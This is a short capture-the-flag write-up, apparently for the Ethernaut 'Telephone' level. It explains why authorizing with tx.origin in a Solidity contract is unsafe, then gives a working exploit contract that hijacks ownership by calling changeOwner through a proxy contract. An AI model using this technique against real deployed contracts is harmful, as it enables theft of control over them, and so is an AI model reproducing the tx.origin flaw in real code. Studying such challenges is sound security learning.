# Telephone

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

In this the interesting bit that looked was `tx.origin` so I googled about it and immediately found, [Solidity doc on tx.origin](https://docs.soliditylang.org/en/v0.6.2/security-considerations.html#tx-origin)

> Never use tx.origin for authorization

The basic difference between `tx.origin` and `msg.sender` is that the latter can be a `contract` and the former cannot be a contract.
- https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin/1892

so if we call the given contract with another contract, the `tx.origin` would be my `metamask` and the `msg.sender` will be the contract.

## Exploit

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneKiller {

  Telephone ogContract = Telephone(0x6aBBd652380d34Bea6a0C680A81c83cd942f6197);

  function pwned(address killer) public {
      ogContract.changeOwner(killer);
  }
}
```

Deploy the contract and call with own address. To confirm run:

```js
await contract.owner()
```